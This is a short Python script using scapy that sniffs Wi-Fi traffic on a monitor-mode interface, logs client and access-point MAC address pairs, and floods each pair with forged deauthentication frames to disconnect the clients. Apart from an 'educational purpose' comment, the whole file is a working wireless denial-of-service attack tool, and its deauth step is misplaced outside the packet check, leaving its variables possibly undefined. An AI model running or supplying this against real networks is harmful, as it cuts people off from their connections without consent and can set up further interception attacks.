#test only for educational purpose 
from scapy.all import sniff,Dot11,RadioTap,sendp ,Dot11Deauth
lists=set()
def macwithap(packet):
    if packet.haslayer(Dot11) and packet.type==2 :
        client=packet.addr1
        ap=packet.addr2
        if client and ap and (client,ap) not in lists:
            lists.add((client,ap))
            for user,wifi in lists:
                print(f"clientinrow:{user}-->Wifi:{wifi}")
                
    dot11=Dot11(addr1=client,addr2=ap,addr3=ap)
    packet=RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet,iface="wlan0mon",count=10,verbose=0)
            
sniff(iface="wlan0mon",prn=macwithap)